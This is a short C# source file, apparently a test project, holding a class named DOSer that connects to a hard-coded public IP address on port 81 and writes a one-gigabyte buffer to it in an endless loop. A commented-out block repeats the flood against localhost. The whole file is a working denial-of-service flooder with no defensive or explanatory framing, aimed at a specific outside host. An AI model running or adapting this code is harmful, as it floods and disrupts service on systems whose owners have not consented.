using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

using System.Net;
using System.Net.Sockets;

using TCPLib;

namespace zTest
{
    class DOSer
    {

        TcpClient _tcpClient;


        public DOSer()
        {

            _tcpClient = new TcpClient();
            _tcpClient.Connect(IPAddress.Parse("83.146.113.81"), 81);

            
            NetworkStream tcpStream = _tcpClient.GetStream();

            

            const int sz = 1000000000;
            byte [] buff = new byte [sz];

            for (int i = 0; i < sz; i++)
                buff[i] = 1;

            while (true)
            {
                tcpStream.Write(buff, 0, sz);
            }

            Thread.Sleep(100000);
           /* CTCPClient tc = new CTCPClient("127.0.0.1", 81);
            bool b = tc.ConnectToServer();
            if (b)
            {
                
                byte[] message = new byte[20000000];
                while(true)
                tc.WriteMessage(message);
            }
            */

        }


    }
}
